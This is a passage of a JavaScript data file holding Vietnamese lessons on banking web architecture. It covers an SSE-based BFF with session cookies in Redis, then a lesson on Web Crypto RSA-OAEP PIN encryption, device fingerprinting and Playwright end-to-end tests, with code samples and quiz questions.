      "    public SseEmitter streamBalanceEvents(@CookieValue(\"__Host-ib_session\") String sessionId, HttpServletResponse res) {",
      "        String cif = redis.opsForValue().get(\"bff:sess:cif:\" + sessionId);",
      "        if (cif == null) throw new ResponseStatusException(HttpStatus.UNAUTHORIZED);",
      "        res.setHeader(\"X-Accel-Buffering\", \"no\"); // Cấm Nginx gom bộ đệm làm trễ thông báo tiền về",
      "        SseEmitter emitter = new SseEmitter(300_000L);",
      "        emittersByCif.put(cif, emitter);",
      "        Runnable cleanup = () -> emittersByCif.remove(cif, emitter);",
      "        emitter.onCompletion(cleanup); emitter.onTimeout(cleanup); emitter.onError(e -> cleanup.run());",
      "        return emitter;",
      "    }",
      "",
      "    public void onBalanceUpdatedFromPubSub(String cif, BalanceAlertDto alert) {",
      "        SseEmitter emitter = emittersByCif.get(cif);",
      "        if (emitter == null) return;",
      "        try {",
      "            emitter.send(SseEmitter.event().id(alert.eventId()).name(\"BALANCE_UPDATED\").data(alert));",
      "        } catch (Exception ex) { emittersByCif.remove(cif, emitter); }",
      "    }",
      "}"
    ].join("\n"),
    codeNotes: [
      "Mô hình Token Handler triệt để: Trình duyệt chỉ gửi lên mã phiên đục (`__Host-ib_session`), tầng BFF tự ánh xạ sang chuỗi `jwt` nội bộ trong Redis để gọi xuống `/internal/v1/accounts/summary` — kiểm tra Network tab trên trình duyệt sẽ không thấy bất kỳ dấu vết JWT hay cấu trúc Microservice nội bộ nào!",
      "Header `X-Accel-Buffering: no`: Chi tiết thực chiến cực đắt giá! Rất nhiều lập trình viên chạy SSE trên máy local thấy nhảy tức thì, nhưng đưa lên K8s đi qua Nginx Ingress thì thông báo bị ngâm 45 giây mới bật ra do cơ chế Proxy Buffering mặc định.",
      "Dọn dẹp bộ nhớ nguyên tử `emittersByCif.remove(cif, emitter)`: Dùng phương thức `remove(key, value)` 2 tham số của `ConcurrentHashMap` để tránh trường hợp khách F5 mở kết nối mới rồi sự kiện `onCompletion` muộn của kết nối cũ lại xóa nhầm đối tượng `SseEmitter` mới vừa tạo!",
      "Đính kèm `.id(alert.eventId())` trên sự kiện SSE: Khi trình duyệt tự động nối lại sau khi chập chờn mạng, nó sẽ gửi kèm `Last-Event-ID` đúng bằng `eventId` này lên BFF để dễ dàng kiểm tra và đẩy bù thông báo biến động số dư bị sót."
    ],
    labGuide: {
      goal: "Xây dựng dịch vụ Spring Boot BFF ẩn hoàn toàn JWT phía sau Cookie phiên và đẩy thông báo cộng tiền VietQR tức thời xuống trình duyệt qua `EventSource (SSE)`.",
      steps: [
        "Bước 1: Dựng `RetailBankingBffController` kết nối Redis local, tạo một endpoint giả lập đăng nhập lưu cặp `bff:sess:jwt:<sid>` và `bff:sess:cif:<sid>` vào Redis đồng thời trả về cookie `__Host-ib_session`.",
        "Bước 2: Trên trang HTML/React viết `const es = new EventSource('/bff/v1/notifications/stream', { withCredentials: true }); es.addEventListener('BALANCE_UPDATED', e => console.log(JSON.parse(e.data)));`.",
        "Bước 3: Tạo thêm một API nội bộ giả lập Webhook nhận tiền VietQR gọi hàm `onBalanceUpdatedFromPubSub(cif, alert)` và bắn thử bằng `curl`.",
        "Bước 4: Quan sát màn hình trình duyệt bật thông báo số tiền cộng vào trong dưới 50ms mà không cần bất kỳ lệnh Polling nào, đồng thời kiểm chứng trên DevTools rằng không có bất kỳ chuỗi Bearer JWT nào xuất hiện phía Client."
      ],
      expectedOutput: "Trình duyệt nhận sự kiện `BALANCE_UPDATED` tức thời dưới 50ms qua luồng `text/event-stream`; JWT hoàn toàn nằm kín ở tầng BFF/Redis; tắt tab trình duyệt tự động giải phóng `SseEmitter` khỏi `ConcurrentHashMap` không gây rò rỉ RAM."
    },
    examTips: [
      "Câu hỏi bẫy thiết kế hệ thống phân tán với `SSE / WebSocket`: 'Nếu BFF chạy 6 Pod trên Kubernetes thì chuyện gì xảy ra khi Kafka Consumer ở Pod 2 nhận tin cộng tiền nhưng khách đang giữ kết nối SSE ở Pod 5?' -> Bắt buộc phải có tầng phát tán **Redis Pub/Sub** (hoặc Kafka consumer group riêng cho mỗi Pod) để mọi Pod đều nhận tín hiệu và Pod nào đang giữ kết nối của `cif` đó sẽ đẩy xuống!",
      "Đừng biến BFF thành 'ESB / Monolith thứ hai': Nếu cả Mobile BFF và Web BFF đều phải tính cùng một công thức hạn mức tín dụng khả dụng, công thức đó phải đẩy xuống `Credit-Service` ở tầng Domain bên dưới chứ không copy-paste vào 2 BFF.",
      "Với kết nối SSE qua HTTP/1.1 cũ, trình duyệt giới hạn tối đa 6 kết nối mỗi tên miền (mở 6 tab là nghẽn); bắt buộc bật **HTTP/2** trên Ingress/Load Balancer của cổng BFF để hàng trăm tab dùng chung 1 kết nối TCP mượt mà."
    ],
    summaryTakeaways: [
      "Kiến trúc `BFF` kết hợp `Token Handler Pattern` giữ toàn bộ OAuth2 Access/Refresh Token ở phía Server/Redis, chỉ trao cho trình duyệt một `HttpOnly` Cookie phiên an toàn và cho phép thu hồi phiên tức thì.",
      "BFF tổng hợp song song nhiều Microservices qua mạng nội bộ tốc độ cao và chuẩn hóa gói dữ liệu may đo riêng cho từng thiết bị (Web Cá nhân, Web Doanh nghiệp, Mobile App).",
      "`Micro-Frontends` chia nhỏ Super App ngân hàng theo từng phân hệ nghiệp vụ độc lập, kết hợp hoàn hảo với cổng BFF chung tên miền để chia sẻ phiên xác thực liền mạch.",
      "Ưu tiên `SSE` trên nền HTTP/2 (kèm `X-Accel-Buffering: no`, nhịp tim `keepalive` và Redis Pub/Sub liên Pod) cho bài toán đẩy thông báo biến động số dư và kết quả VietQR một chiều từ Server xuống Client."
    ],
    lessonQuestions: [
      {
        question: "Ngân hàng triển khai tính năng hiển thị xác nhận thanh toán VietQR tức thời cho các cửa hàng qua `SseEmitter` trên dịch vụ `web-bff` (chạy 8 Pod trên Kubernetes phía sau Nginx Ingress). Khi kiểm thử với 1 Pod trên môi trường Dev thì màn hình cửa hàng nhận thông báo cộng tiền ngay lập tức, nhưng khi đưa lên Staging chạy 8 Pod thì xác suất cửa hàng nhận được thông báo rớt xuống chỉ còn khoảng 12.5% (cứ 8 lần chuyển tiền thì mất 7 lần im lìm), và những lần nhận được lại bị trễ gần 40 giây! Đâu là bộ đôi nguyên nhân chính xác nhất?",
        options: [
          "Do `SseEmitter` của Spring Boot chỉ hỗ trợ tối đa 1 người dùng duy nhất trên toàn cụm máy chủ.",
          "Thứ nhất, `Map<String, SseEmitter>` chỉ nằm trong RAM cục bộ của từng Pod nên khi sự kiện cộng tiền rơi vào 1 trong 7 Pod không giữ kết nối của cửa hàng đó thì bị bỏ qua (cần bổ sung Redis Pub/Sub phát tới tất cả 8 Pod); thứ hai, Nginx Ingress đang bật Proxy Buffering mặc định gom dữ liệu làm om thông báo (cần trả header `X-Accel-Buffering: no`).",
          "Do trình duyệt tự động chặn giao thức SSE khi phát hiện hệ thống phía sau dùng Kubernetes.",
          "Do Redis không hỗ trợ lưu chuỗi JSON tiếng Việt nên làm rơi 87.5% gói tin thông báo."
        ],
        answer: 1,
        explanation: "Con số xác suất $1 / 8 = 12.5\\%$ là dấu hiệu toán học điển hình của lỗi lưu trạng thái kết nối cục bộ trên 8 Pod mà thiếu cơ chế phát quảng bá liên Pod: chỉ khi Pod xử lý sự kiện tình cờ trùng đúng với Pod đang giữ kết nối `SseEmitter` của chủ cửa hàng thì tin nhắn mới gửi đi được! Cộng thêm Nginx Ingress mặc định đệm phản hồi (`proxy_buffering on`) chờ đầy bộ đệm mới xả xuống Client gây độ trễ hàng chục giây nếu thiếu `X-Accel-Buffering: no`.",
        wrongReasons: [
          "`SseEmitter` hỗ trợ hàng chục nghìn kết nối đồng thời trên mỗi Pod nếu cấu hình bất đồng bộ chuẩn.",
          "",
          "Trình duyệt hoàn toàn không biết và không quan tâm phía sau Load Balancer là Kubernetes hay máy chủ vật lý.",
          "Redis xử lý chuỗi UTF-8 nhị phân an toàn tuyệt đối, hoàn toàn không liên quan tới tỉ lệ rơi $7/8$ theo số lượng Pod."
        ]
      },
      {
        question: "Hội đồng Bảo mật của ngân hàng yêu cầu thiết kế lại cổng Internet Banking trên nền trình duyệt với hai tiêu chí bắt buộc: (1) Không được để bất kỳ chuỗi JWT (`access_token` hay `refresh_token`) nào xuất hiện trong bộ nhớ JavaScript hoặc Storage của trình duyệt để tránh lộ cấu trúc quyền hạn nội bộ; (2) Khi hệ thống chống gian lận phát hiện bất thường, phải cắt đứt hoàn toàn quyền gọi API của phiên đó trong vòng dưới 1 giây. Kiến trúc nào đáp ứng trọn vẹn nhất?",
        options: [
          "Mã hóa Base64 chuỗi JWT rồi lưu vào `sessionStorage`, khi cần khóa tài khoản thì gửi email nhắc khách hàng tự đóng trình duyệt.",
          "Áp dụng kiến trúc `BFF Token Handler Pattern`: trình duyệt chỉ giữ `__Host-` `HttpOnly` Cookie chứa mã phiên ngẫu nhiên, còn toàn bộ JWT được BFF cất giữ và tự làm mới trong Redis; khi cần khóa khẩn cấp chỉ cần xóa bản ghi phiên đó trong Redis tại tầng BFF.",
          "Tăng thời hạn sống của JWT lên 30 ngày để không cần lưu Refresh Token trên trình duyệt.",
          "Cho trình duyệt gọi thẳng vào từng Microservice nội bộ bằng Basic Auth (Username + Password gửi kèm mỗi request)."
        ],
        answer: 1,
        explanation: "Mô hình `BFF Token Handler` tách rời hoàn toàn định danh ngoài biên (Opaque Cookie vô nghĩa với trình duyệt, không thể đọc bằng JS nhờ `HttpOnly`) và chứng thực nội bộ (OAuth2 JWT lưu trong Redis phía Server). Ngay khi xóa key phiên trong Redis ở tầng BFF, mọi request tiếp theo từ trình duyệt bị từ chối `401` tức thời dưới 1 mili-giây mà không cần chờ JWT hết hạn tự nhiên.",
        wrongReasons: [
          "Base64 chỉ là mã hóa biểu diễn văn bản chứ không phải mật mã học, lưu trong `sessionStorage` vẫn bị đọc sạch bởi XSS và không thể thu hồi từ xa.",
          "",
          "JWT sống 30 ngày trên trình duyệt vừa vi phạm tiêu chí lộ JWT vừa khiến hệ thống mất hoàn toàn khả năng thu hồi khẩn cấp nếu thiếu tầng kiểm tra trạng thái.",
          "Truyền mật khẩu gốc liên tục qua mạng và mở thông trình duyệt vào thẳng Microservices nội bộ là thảm họa bảo mật cấp độ cao nhất."
        ]
      }
    ]
  },

  F6: {
    duration: "55 phút",
    difficulty: "Nâng cao – Mật mã Client, Chống Gian lận & Playwright E2E",
    codeLang: "typescript",
    teacherIntro: "Chào em, mảnh ghép cuối cùng để hoàn thiện bản lĩnh Full-Stack Ngân hàng của chúng ta chạm tới tầng bảo vệ tinh vi nhất trên thiết bị người dùng và lưới an toàn tự động hóa trước giờ lên sóng Production! Trong các buổi phỏng vấn vị trí Senior/Lead tại ngân hàng hoặc tổ chức thẻ, hội đồng rất hay đặt câu hỏi hóc búa: *'Đường truyền từ trình duyệt về ngân hàng đã bật HTTPS TLS 1.3 mã hóa mạnh rồi, tại sao khi khách nhập mã PIN thẻ 6 số hoặc mật khẩu giao dịch lại vẫn bắt Frontend phải mã hóa thêm một lớp RSA nữa bằng `Web Crypto API` trước khi gửi đi?'*. Nếu em trả lời rành mạch được hành trình giải mã TLS tại F5/WAF/Ingress và yêu cầu cô lập vùng bảo mật HSM theo chuẩn PCI-DSS, em sẽ ghi điểm tuyệt đối! Song song đó, chúng ta sẽ tìm hiểu cách nhận diện thiết bị lạ chống chiếm đoạt tài khoản (tuân thủ Quyết định 2345 của NHNN) và dùng **Playwright** tiêm lỗi mạng tự động để chứng minh toàn bộ dây chuyền từ nút bấm giao diện xuống tới sổ cái Java không bao giờ mất một đồng nào!",
    analogy: {
      title: "Chiếc phong bì sáp niêm phong riêng cho Giám đốc Kho bạc để bên trong xe bọc thép chung",
      body: "Em hãy tưởng tượng kết nối `HTTPS/TLS` giống như chiếc **xe bọc thép vận chuyển thư từ** chạy từ nhà khách hàng tới cổng tòa nhà ngân hàng. Trên đường phố, không tên cướp nào mở được thùng xe. Nhưng vừa lăn bánh qua cổng rào ngân hàng (`Load Balancer / WAF / API Gateway`), đội bảo vệ sảnh ngoài đã mở thùng xe ra để soi chiếu virus, ghi sổ nhật ký ra vào (`Access/Audit Log`) rồi mới chuyển thư bằng xe đẩy thường vào các phòng ban bên trong! Nếu khách hàng viết tơ hơ 6 số **Mã PIN thẻ ATM** trên mặt bưu thiếp trần, thì anh bảo vệ trực cổng hay hệ thống camera hành lang (`APM / Proxy Log`) sẽ đọc thấy sạch sành sanh! Vì vậy, ngay tại bàn viết ở nhà khách hàng (`Trình duyệt`), ta dùng `Web Crypto API` bỏ mã PIN vào một **chiếc hộp thép khóa bằng ổ khóa Công khai (`RSA-OAEP Public Key`)** mà chìa mở duy nhất chỉ nằm sâu trong buồng két sắt tối mật (`HSM / Card Vault`) ở tầng hầm cuối cùng — dù xe bọc thép có mở tung ở 5 trạm gác trung gian thì mã PIN bên trong vẫn bất khả xâm phạm!"
    },
    objectives: [
      "Triển khai được mã hóa tầng ứng dụng ngay trên trình duyệt bằng `Web Crypto API` nguyên bản (`RSA-OAEP` với `SHA-256` kèm dấu thời gian/nonce chống phát lại) để bảo vệ PIN thẻ và mật khẩu nhạy cảm xuyên suốt tới Backend/HSM.",
      "Hiểu cơ chế `Device Fingerprinting` & đánh giá rủi ro theo ngữ cảnh thiết bị để kích hoạt xác thực tăng cường (Step-up Biometric/Smart OTP) chống chiếm đoạt tài khoản (ATO).",
      "Xây dựng được kịch bản kiểm thử đầu-cuối (`End-to-End`) tự động bằng `Playwright` có tiêm lỗi giả lập (`504 Gateway Timeout`, chậm mạng) kiểm chứng trọn vẹn tính lũy đẳng từ UI xuống Backend."
    ],
    flow: [
      {
        step: "1. Tải Khóa Công khai & Niêm phong PIN bằng `Web Crypto API`",
        detail: "Trình duyệt nhận khóa công khai RSA-2048 (`SPKI`) kèm mã phiên thách thức từ Server, dùng động cơ C++ nguyên bản `window.crypto.subtle.encrypt` đóng gói `PIN | txnId | timestamp` thành bản mã `RSA-OAEP`."
      },
      {
        step: "2. Thu thập Ngữ cảnh Thiết bị Chống Chiếm quyền (Device Signals)",
        detail: "Gói tin giao dịch đính kèm dấu vân tay môi trường thiết bị và trạng thái liên kết thiết bị tin cậy để Fraud Engine phía Java quyết định cho qua êm hay bắt buộc xác thực khuôn mặt Step-up."
      },
      {
        step: "3. Vận chuyển Xuyên Trạm Trung gian Không Lộ Văn bản Rõ",
        detail: "Khi gói tin đi qua CDN, WAF, Reverse Proxy và API Gateway nơi TLS đã được giải mã, trường `encryptedPinBlock` vẫn hoàn toàn ở dạng bản mã ngẫu nhiên cho đến khi vào vùng bảo mật giải mã bằng Private Key / HSM."
      },
      {
        step: "4. Kiểm chứng Hồi quy Đầu-Cuối Tự động bằng `Playwright`",
        detail: "Trong CI/CD Pipeline, Playwright mở trình duyệt thật thực hiện chuyển khoản, chủ động chặn tiêm lỗi mạng `504` ở lần gửi đầu rồi bấm 'Thử lại' để xác minh cả UI và Backend phối hợp giữ nguyên số dư chuẩn xác."
      }
    ],
    sections: [
      {
        heading: "1. Mã hóa Cấp độ Ứng dụng với `Web Crypto API`: Bảo vệ PIN khỏi lộ lọt tại các tầng Proxy trung gian",
        paragraphs: [
          "Trong kiến trúc hạ tầng ngân hàng thực tế, kết nối mã hóa đường truyền `HTTPS (TLS)` từ trình duyệt của khách hàng hiếm khi đi thẳng một mạch tới tận tiến trình Java giữ sổ cái hay buồng phần cứng HSM. Thay vào đó, TLS bị chấm dứt (TLS Termination) ngay ở vành đai ngoài như **Cloudflare / Akamai, F5 BIG-IP Load Balancer, Web Application Firewall (WAF) và API Gateway** để các thiết bị an ninh này kiểm tra gói tin độc hại và định tuyến lưu lượng. Nếu giao diện gửi JSON thuần `{ \"cardId\": \"...\", \"pin\": \"190895\" }`, chỉ cần một kỹ sư vận hành vô tình bật chế độ ghi log Request Body trên Gateway để gỡ lỗi, hoặc một công cụ giám sát APM (như Elastic APM / Dynatrace) chụp lại payload khi có lỗi `500`, toàn bộ mã PIN thẻ thật và mật khẩu của khách hàng sẽ nằm phơi bày dạng văn bản rõ trong kho log tập trung — vi phạm nghiêm trọng chuẩn **PCI-DSS 4.0**!",
          "Để khép kín lỗ hổng này (End-to-End Application-Layer Encryption), ngay trên trình duyệt ta sử dụng chuẩn **`Web Crypto API` (`window.crypto.subtle`)** tích hợp sẵn trong nhân trình duyệt hiện đại (chạy bằng mã máy C++/Rust cực nhanh và an toàn hơn hẳn việc tải các thư viện mật mã viết thuần bằng JS cũ kỹ như `crypto-js`). Trình duyệt nhập khóa công khai RSA-2048/4096 của ngân hàng theo thuật toán đệm ngẫu nhiên **`RSA-OAEP` băm `SHA-256`** (tuyệt đối không dùng chuẩn cũ `RSAES-PKCS1-v1_5` dễ dính tấn công Bleichenbacher!). Đặc biệt, một kinh nghiệm xương máu của anh: **đừng bao giờ chỉ mã hóa trơ trọi 6 chữ số PIN!** Hãy ghép chung mã giao dịch và dấu thời gian hiện tại vào bên trong khối văn bản trước khi mã hóa (`\"190895|TXN-9921|1732410000123\"`). Nhờ tính ngẫu nhiên của đệm OAEP cộng với `txnId + timestamp` bên trong, mỗi lần bấm gửi bản mã luôn khác nhau 100%, và nếu kẻ gian bắt được bản mã ở giao dịch A đem gắn sang giao dịch B (Replay Attack), khi Backend/HSM giải mã ra thấy lệch `txnId` hoặc quá hạn 60 giây sẽ lập tức từ chối!"
        ],
        bullets: [
          "Chỉ hoạt động trên Ngữ cảnh An toàn (`Secure Context`): Trình duyệt tự động khóa `window.crypto.subtle` (trả về `undefined`) nếu trang web chạy qua `http://` không mã hóa (trừ `localhost`), ép buộc toàn hệ thống phải tuân thủ HTTPS.",
          "Chống lộ lọt nội bộ nhưng KHÔNG thay thế HTTPS: Mã hóa ở Client vẫn phụ thuộc vào việc trang HTML/JS gốc và Public Key tải về qua HTTPS chính chủ không bị tráo đổi trên đường truyền.",
          "Quản lý vòng đời Khóa (`Key Rotation` với `kid`): Luôn đính kèm mã phiên bản khóa (`keyId`, ví dụ `pin-rsa-2026-q4`) cùng với bản mã gửi xuống để Backend biết phải dùng cặp khóa nào trong HSM giải mã khi ngân hàng xoay vòng khóa định kỳ."
        ]
      },
      {
        heading: "2. Nhận diện Thiết bị (`Device Fingerprinting`) & Xác thực Thích ứng Chống Chiếm đoạt Tài khoản (ATO)",
        paragraphs: [
          "Trong bối cảnh tội phạm công nghệ cao dùng thủ đoạn lừa đảo giả danh (Social Engineering / Phishing) chiếm đoạt tài khoản đăng nhập ngày càng tinh vi, việc chỉ kiểm tra đúng mật khẩu và phiên Cookie là không đủ. Theo **Quyết định 2345/QĐ-NHNN** và các thông tư mới của Ngân hàng Nhà nước Việt Nam, các giao dịch chuyển tiền vượt ngưỡng (ví dụ trên 10 triệu đồng/lần hoặc tổng trên 20 triệu đồng/ngày) hoặc **khi khách hàng thực hiện giao dịch lần đầu trên một thiết bị lạ** bắt buộc phải kích hoạt bước xác thực sinh trắc học đối khớp khuôn mặt với dữ liệu CCCD gắn chip! Để Backend Fraud Engine biết được 'đây có phải chiếc máy tính quen thuộc mọi ngày khách vẫn ngồi ở nhà hay là máy trạm của tổ chức tội phạm ở biên giới?', tầng Frontend đóng vai trò thu thập tín hiệu ngữ cảnh thiết bị (**Device Intelligence / Fingerprinting**).",
          "Trên trình duyệt Web (nơi không có mã phần cứng cố định như Secure Enclave của iOS hay StrongBox Keystore của Android), hệ thống kết hợp hai lớp định danh: Lớp 1 là **Khóa liên kết thiết bị tin cậy (`Device Binding Keypair`)** sinh bằng chính `Web Crypto API` (`ECDSA P-256` với cờ `extractable: false` lưu trong `IndexedDB` — mã JavaScript chỉ có thể nhờ trình duyệt ký số bằng khóa riêng tư đó chứ không thể xuất khóa thô ra mang sang máy khác!). Lớp 2 là **Tín hiệu đặc trưng môi trường** (độ phân giải, múi giờ hệ thống, ngôn ngữ, đặc tính dựng hình card đồ họa WebGL, nhịp gõ phím tự nhiên vs kịch bản dán tự động của bot). Toàn bộ tín hiệu này được gửi kèm lên `Fraud-Service` phía Java trong dưới 20ms để chấm điểm rủi ro tức thời: nếu khớp thiết bị quen + số tiền nhỏ thì cho qua mượt mà; nếu phát hiện thiết bị mới tinh vừa đăng nhập đã lập tức đổi hạn mức và rút sạch tài khoản lúc 2 giờ sáng thì trả mã yêu cầu **Step-up Authentication (Xác thực tăng cường qua App Mobile chính chủ / Sinh trắc học)** hoặc tạm giữ kiểm tra."
        ],
        bullets: [
          "Khóa `ECDSA non-extractable` trong `IndexedDB`: Khác với chuỗi ID lưu trong Cookie dễ bị copy sang máy hacker, khóa mật mã gắn cờ `extractable: false` không thể bị trích xuất nguyên bản ra thành chuỗi văn bản mang đi nhân bản.",
          "Phát hiện hành vi Bot / Remote Access: Đo tốc độ điền biểu mẫu bất thường (điền xong 5 trường chuyển tiền trong 12ms không có sự kiện gõ phím tự nhiên) giúp cảnh báo sớm kịch bản công cụ tự động chiếm quyền.",
          "Minh bạch quyền riêng tư & Không chặn nhầm cực đoan: Trình duyệt thường xuyên tự động nâng cấp phiên bản làm đổi nhẹ dấu vân tay phần mềm; vì vậy khi điểm khớp giảm nhẹ, hệ thống nên yêu cầu xác thực bổ sung (`Step-up OTP/Biometric`) thay vì khóa cứng tài khoản gây phiền hà cho khách thật."
        ]
      },
      {
        heading: "3. Lưới an toàn Cuối cùng trước Giờ G: Kiểm thử Đầu-Cuối Tự động với `Playwright`",
        paragraphs: [
          "Hãy nhìn lại toàn bộ hành trình 6 bài học của chúng ta: Backend viết JUnit + Testcontainers xanh mướt 100%, Frontend viết Unit Test bằng Vitest cũng xanh mướt 100% — nhưng vừa ghép hai mảnh lại đẩy lên Staging thì khách hàng không bấm chuyển tiền được! Nguyên nhân có thể đến từ hàng chục điểm gãy ở đường nối: Backend đổi tên trường JSON từ `amount` sang `amountVnd`, chỉ thị `Content-Security-Policy` vô tình chặn mất file worker mã hóa PIN, hay cấu hình `SameSite` Cookie làm rớt phiên ở bước chuyển hướng đăng nhập! Đó là lý do mọi luồng nghiệp vụ trọng yếu nhất của ngân hàng (**Critical User Journeys — CUJs**: Đăng nhập -> Truy vấn tên người nhận -> Mã hóa PIN / Nhập Smart OTP -> Hạch toán -> Nhận SSE biến động số dư) bắt buộc phải được bảo vệ bởi bộ kiểm thử đầu-cuối tự động bằng **`Playwright`** chạy trên trình duyệt thật (Chromium, WebKit/Safari, Firefox) ngay trong đường ống CI/CD.",
          "Điểm vượt trội tuyệt đối khiến `Playwright` đánh bật các công cụ đời cũ như Selenium trong các dự án Fintech hiện đại là cơ chế **Auto-waiting thông minh** (tự động chờ phần tử ổn định, không cần rải `sleep(3000)` gây chập chờn Flaky Test), khả năng mở đồng thời **2 ngữ cảnh trình duyệt độc lập trong cùng 1 bài test** (ví dụ: Browser Context 1 đóng vai Người chuyển tiền, Browser Context 2 đóng vai Chủ cửa hàng mở màn hình VietQR chờ nhận thông báo SSE cộng tiền trực tiếp!), và đặc biệt là vũ khí **`page.route()` cho phép tiêm lỗi mạng có kiểm soát**. Em có thể viết một bài test tự động chặn đúng lượt gọi `POST /api/v1/transfers` đầu tiên giả lập đứt mạng hoặc trả `504 Gateway Timeout`, sau đó cho kịch bản bấm nút 'Thử lại' và khẳng định bằng code rằng trình duyệt gửi đi cùng một `Idempotency-Key` và số dư tài khoản trên Database chỉ bị trừ ĐÚNG 1 LẦN!"
        ],
        bullets: [
          "Tập trung đúng Đỉnh Tháp Kiểm thử (5–10 luồng Sống còn): Không viết hàng nghìn bài E2E chậm chạp cho mọi màu sắc nút bấm; chỉ chọn lọc các luồng tạo doanh thu và di chuyển tiền tệ cốt lõi nhất để bộ test chạy gọn dưới 5 phút.",
          "Ghi hình Hộp đen khi Test Đỏ (`Trace Viewer`): Bật cấu hình `trace: 'on-first-retry'` để khi một bài test chuyển tiền thất bại trên GitLab CI lúc nửa đêm, kỹ sư mở file Trace lên xem lại từng khung hình giao diện, từng gói tin HTTP Header, Cookie và Console Log tại đúng mili-giây xảy ra lỗi.",
          "Kiểm tra tự động cả Header Bảo mật trên E2E: Dùng ngay Playwright kiểm chứng trang ngân hàng thực tế có trả đủ `Content-Security-Policy`, cookie `__Host-` có bật `httpOnly: true` và không có bất kỳ lỗi vi phạm CSP nào trên Console."
        ]
      }
    ],
    comparison: {
      title: "Bảng phân tích phân tầng Bảo mật Dữ liệu & Kiểm thử Tích hợp Ngân hàng Số",
      headers: ["Lớp Bảo vệ / Kiểm chứng", "Công nghệ Chuẩn", "Rủi ro Cụ thể được Giải quyết", "Giới hạn nếu Đứng một mình"],
      rows: [
        [
          "Mã hóa Đường truyền (`HTTPS / TLS 1.3`)",
          "Chứng chỉ số TLS chuẩn tại Ingress / WAF / CDN",
          "Chặn nghe lén và sửa đổi gói tin trên mạng Wi-Fi công cộng, nhà mạng ISP",
          "Bị giải mã tại biên hạ tầng (WAF/Gateway); dữ liệu nhạy cảm dạng rõ dễ lọt vào Access/APM Log nội bộ"
        ],
        [
          "Mã hóa Tầng Ứng dụng (`Web Crypto API`)",
          "`window.crypto.subtle` (`RSA-OAEP` SHA-256 + `txnId/timestamp`)",
          "Giữ kín mã PIN thẻ, CVV, mật khẩu giao dịch xuyên qua mọi proxy trung gian cho tới tận HSM/Vault",
          "Vẫn cần HTTPS chuẩn và CSP chặt để đảm bảo đoạn mã JS và Public Key tải về không bị kẻ gian tráo đổi"
        ],
        [
          "Liên kết & Nhận diện Thiết bị (`Device Binding`)",
          "Khóa `ECDSA` `extractable: false` trong `IndexedDB` + Ngữ cảnh thiết bị",
          "Phát hiện đăng nhập/rút tiền từ thiết bị lạ để ép xác thực khuôn mặt Step-up theo Quyết định 2345",
          "Người dùng xóa trắng dữ liệu trình duyệt sẽ cần thực hiện lại bước đăng ký thiết bị tin cậy"
        ],
        [
          "Kiểm thử Đầu-Cuối (`Playwright E2E`)",
          "Playwright Multi-Context + `page.route()` tiêm lỗi mạng",
          "Bắt tận tay lỗi đứt gãy hợp đồng JSON, lỗi CORS/Cookie/CSP và lỗi trừ kép khi rớt mạng bấm thử lại",
          "Chi phí chạy cao hơn Unit/Integration Test nên chỉ dành cho nhóm luồng nghiệp vụ trọng yếu nhất"
        ]
      ]
    },
    codeTitle: "Mã hóa Mã PIN Giao dịch bằng Web Crypto API (`RSA-OAEP` SHA-256) Chống Lộ Log & Chống Phát lại",
    code: [
      "export interface EncryptedPinEnvelope {",
      "  keyId: string;",
      "  algorithm: \"RSA-OAEP-256\";",
      "  cipherTextBase64: string;",
      "}",
      "",
      "function pemBodyToArrayBuffer(spkiPem: string): ArrayBuffer {",
      "  const b64 = spkiPem.replace(/-----BEGIN PUBLIC KEY-----|-----END PUBLIC KEY-----|\\s+/g, \"\");",
      "  const bin = window.atob(b64);",
      "  const bytes = new Uint8Array(bin.length);",
      "  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);",
      "  return bytes.buffer;",
      "}",
      "",
      "export async function encryptTransactionPin(",
      "  rawPin: string,",
      "  txnId: string,",
      "  serverSpkiPem: string,",
      "  keyId: string",
      "): Promise<EncryptedPinEnvelope> {",
      "  if (!/^[0-9]{6}$/.test(rawPin)) throw new Error(\"INVALID_PIN_FORMAT\");",
      "  if (!window.isSecureContext || !window.crypto?.subtle) {",
      "    throw new Error(\"INSECURE_BROWSER_CONTEXT\"); // Bắt buộc môi trường HTTPS",
      "  }",
      "  const publicKey = await window.crypto.subtle.importKey(",
      "    \"spki\",",
      "    pemBodyToArrayBuffer(serverSpkiPem),",
      "    { name: \"RSA-OAEP\", hash: \"SHA-256\" },",
      "    false, // extractable = false: khóa nhập vào nhân trình duyệt không cho xuất ngược ra",
      "    [\"encrypt\"]",
      "  );",
      "  // Gắn chặt PIN với mã giao dịch + thời gian thực để chống tấn công bắt gói tin phát lại (Replay)",
      "  const boundBlock = `${rawPin}|${txnId}|${Date.now()}`;",
      "  const encoded = new TextEncoder().encode(boundBlock);",
      "  const cipherBuf = await window.crypto.subtle.encrypt({ name: \"RSA-OAEP\" }, publicKey, encoded);",
      "  const cipherTextBase64 = window.btoa(String.fromCharCode(...new Uint8Array(cipherBuf)));",
      "  return { keyId, algorithm: \"RSA-OAEP-256\", cipherTextBase64 };",
      "}"
    ].join("\n"),
    codeNotes: [
      "Kiểm tra `window.isSecureContext`: Đảm bảo hàm từ chối thực thi ngay lập tức với thông báo rõ ràng nếu môi trường triển khai bị cấu hình thiếu chứng chỉ HTTPS thay vì ném lỗi `Cannot read properties of undefined` khó hiểu.",
      "Thuật toán `RSA-OAEP` kết hợp `SHA-256` và `extractable = false`: Sử dụng bộ máy mật mã nguyên bản trong nhân trình duyệt, tự động chèn chuỗi đệm ngẫu nhiên (OAEP padding) sao cho cùng một mã PIN `123456` mã hóa 2 lần sẽ ra 2 chuỗi `cipherTextBase64` khác hẳn nhau.",
      "Kỹ thuật ràng buộc ngữ cảnh `rawPin|txnId|Date.now()`: Điểm phân biệt thiết kế của chuyên gia ngân hàng! Khi Backend/HSM giải mã khối này, nó bắt buộc kiểm tra `txnId` bên trong bản mã phải khớp với `txnId` của giao dịch hiện tại và độ lệch thời gian `< 60 giây`, chặn đứng âm mưu trích bản mã PIN cũ đem dùng cho lệnh chuyển tiền mới.",
      "Trường `keyId` trong `EncryptedPinEnvelope`: Cho phép hệ thống Backend xoay vòng cặp khóa RSA định kỳ mỗi quý mà không làm gián đoạn các trình duyệt đang mở dở phiên giao dịch ở thời điểm chuyển giao."
    ],
    labGuide: {
